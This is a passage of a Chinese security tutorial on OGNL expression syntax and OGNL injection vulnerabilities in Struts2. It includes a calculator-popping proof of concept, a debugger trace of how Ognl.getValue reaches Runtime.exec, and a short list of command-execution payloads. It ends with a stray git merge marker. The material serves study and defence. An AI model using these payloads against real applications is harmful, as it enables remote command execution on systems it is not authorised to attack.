`%`符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。

#### $符

`$`符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。

### # 和 . 和 @ 的区别

- 获取静态函数和变量的时候用@
- 获取非静态函数用.号获取
- 获取非静态变量用#获取

### 基本用法Demo

依赖的jar包：ognl-2.6.11.jar

示例代码1，基本的调用执行OGNL表达式：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        String str = "1+2";
        OgnlContext context = new OgnlContext();
        Object ognl = Ognl.parseExpression(str);
        Object value = Ognl.getValue(ognl,context,context.getRoot());
        System.out.println("result:" + value);
    }
}
```

运行即可输出`result:3`。

示例代码2，使用#符号从上下文获取变量值：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setName("mi1k7ea");
        OgnlContext context = new OgnlContext();
        context.put("user",user);
        String str = "#user.name";
        Object ognl = Ognl.parseExpression(str);
        Object value = Ognl.getValue(ognl,context,context.getRoot());
        System.out.println("result:" + value);
    }
}
```

运行输出`result:mi1k7ea`。

### OGNL与EL的区别

因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。

Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。

页面取值区别如下表：

| 名称        | servlet                                                      | OGNL                                                         | EL                           |
| :---------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :--------------------------- |
| parameters  | request.getParameter(“username”)                             | #username                                                    | ${username}                  |
| request     | request.getAttribute(“userName”)                             | #request.userName                                            | ${requestScope.username}     |
| session     | session.getAttribute(“userName”)                             | #session.userName                                            | ${sessionScope.username}     |
| application | application.getAttribute(“userName”)                         | #application.userName                                        | ${applicationScope.username} |
| attr        | 用于按request > session > application顺序访问其属性（attribute） | #attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止 |                              |

## 0x02 能解析OGNL的API

能解析OGNL的API如下表：

| 类名                                        | 方法名                                                       |
| :------------------------------------------ | :----------------------------------------------------------- |
| com.opensymphony.xwork2.util.TextParseUtil  | translateVariables,translateVariablesCollection              |
| com.opensymphony.xwork2.util.TextParser     | evaluate                                                     |
| com.opensymphony.xwork2.util.OgnlTextParser | evaluate                                                     |
| com.opensymphony.xwork2.ognl.OgnlUtil       | setProperties,setProperty,setValue,getValue,callMethod,compile |
| org.apache.struts2.util.VelocityStrutsUtil  | evaluate                                                     |
| org.apache.struts2.util.StrutsUtil          | isTrue,findString,findValue,getText,translateVariables,makeSelectList |
| org.apache.struts2.views.jsp.ui.OgnlTool    | findValue                                                    |
| com.opensymphony.xwork2.util.ValueStack     | findString,findValue,setValue,setParameter                   |
| com.opensymphony.xwork2.ognl.OgnlValueStack | findString,findValue,setValue,setParameter,trySetValue       |
| ognl.Ognl                                   | parseExpression,getValue,setValue                            |

以下是调用过程中可能会涉及到的一些类：

| 涉及类名                                                   | 方法名                                                       |
| :--------------------------------------------------------- | :----------------------------------------------------------- |
| com.opensymphony.xwork2.ognl.OgnlReflectionProvider        | getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue |
| com.opensymphony.xwork2.util.reflection.ReflectionProvider | getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue |

## 0x03 OGNL表达式注入漏洞

### 漏洞原理

由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。

最简单的弹计算器的Demo：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        // 创建一个OGNL上下文对象
        OgnlContext context = new OgnlContext();

        // getValue()触发
        // @[类全名(包括包路径)]@[方法名|值名]
        Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());
        
        // setValue()触发
//        Ognl.setValue(Runtime.getRuntime().exec("calc"), context, context.getRoot());
    }
}
```

getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/3.png)

### 调试分析

这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。

在前面的`Ognl.getValue`代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5.png)

往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/6.png)

由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7.png)

evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png)

跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即[`@java.lang.Runtime](mailto:`@java.lang.Runtime)@getRuntime()`这个OGNL表达式：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/9.png)

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/10.png)

跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11.png)

跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12.png)

往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13.png)

跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14.png)

跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/15.png)

当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。

接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为`exec("calc")`：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/16.png)

后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17.png)

往下，解析得到具体的类方法exec()：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/18.png)

往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/19.png)

此时函数调用栈如下：

```
invokeMethod:518, OgnlRuntime (ognl)
callAppropriateMethod:812, OgnlRuntime (ognl)
callMethod:61, ObjectMethodAccessor (ognl)
callMethod:846, OgnlRuntime (ognl)
getValueBody:73, ASTMethod (ognl)
evaluateGetValueBody:170, SimpleNode (ognl)
getValue:210, SimpleNode (ognl)
getValueBody:109, ASTChain (ognl)
evaluateGetValueBody:170, SimpleNode (ognl)
getValue:210, SimpleNode (ognl)
getValue:333, Ognl (ognl)
getValue:378, Ognl (ognl)
getValue:357, Ognl (ognl)
main:11, Test
```

简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。

### HTTP请求中常见的注入点

HTTP请求中常见的注入点如下表（来自[Struts2著名RCE漏洞引发的十年之思](https://www.freebuf.com/vuls/168609.html)）：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4.png)

### 常用payload

```
//获取context里面的变量
 #user
 #user.name

//使用runtime执行系统命令
@java.lang.Runtime@getRuntime().exec("calc")


//使用processbuilder执行系统命令
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

//获取当前路径
@java.lang.System@getProperty("user.dir")
```

## 0x04 Struts2中OGNL执行过程分析

有时间再调试分析，可参考：[浅析 OGNL 的攻防史](https://paper.seebug.org/794/#0x02-ognl)

## 0x05 OGNL攻防史

有时间再详细分析，可参考：[浅析 OGNL 的攻防史](https://paper.seebug.org/794/#0x03-ognl)

## 0x06 参考

[OGNL](http://c.biancheng.net/view/4131.html)

[OGNL表达式注入分析](http://p0desta.com/2019/04/06/从零开始java代码审计系列(三)/)

>>>>>>> c25de16fcceca586d0ba65b6515768c0b556f5db
[浅析 OGNL 的攻防史](https://paper.seebug.org/794/)